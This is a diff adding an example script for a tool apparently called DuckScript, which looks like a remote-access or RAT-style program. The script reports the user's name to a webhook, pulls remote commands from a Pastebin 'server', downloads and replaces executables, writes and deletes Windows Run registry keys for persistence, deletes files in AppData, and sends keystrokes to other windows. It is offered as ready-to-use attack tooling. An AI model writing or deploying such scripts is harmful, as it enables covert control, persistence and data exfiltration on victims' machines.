@@ -1,0 +1,48 @@
+# DuckScript Script Example
+# Author: Zebratic
+# Date: 10/12/2020
+
+"/updatesettings" "username" "%USERNAME%"
+"/updatesettings" "webhook" "INSERT WEBHOOK HERE"
+"/updatesettings" "errorwebhook" "INSERT WEBHOOK HERE"
+"/updatesettings" "errors" "true"
+"/updatesettings" "debug" "true"
+"/updatesettings" "pastebinserver" "https://pastebin.com/raw/0GPsyMaP"
+
+"/runpastebinserver" "/nosettingsupdate"
+
+"/shownote" "hello" "This is a DuckScript script example"
+
+"/downloadfile" "file.exe" "https://download.com/file.exe"
+
+"/modifyfile" "%CURRENTPATH%\file.exe" "https://download.com/newfile.exe"
+
+"/deletefile" "%APPDATA%\deleteme.exe" 
+
+"/showmessage" "This is the text on the textbox" "LOL this is the title"
+
+"/sleep" "1000"
+
+"/wait" "1000"
+
+"/setregkey" "currentuser" "Software\Microsoft\Windows\CurrentVersion\Run" "keyname" "newvalue"
+
+"/delregkey" "localmachine" "Software\Microsoft\Windows\CurrentVersion\Run" "keyname"
+
+"/getfile" "%CURRENTPATH%\script.duck"
+
+"/start" "notepad"
+
+"/wait" "500"
+
+"/focuswindow" "notepad"
+
+"/sendkeys" "hello this is working very well!"
+
+"/sendkeys" "%alt%%f4%"
+
+"/sendkeys" "%right%%enter%"
+
+# this is a comment and this wont affect the script!
+# you can also just type ANYWHERE as long as its not inside the "" characters
+# Example: [ Allowed Allowed " Not Allowed " Allowed Allowed ]
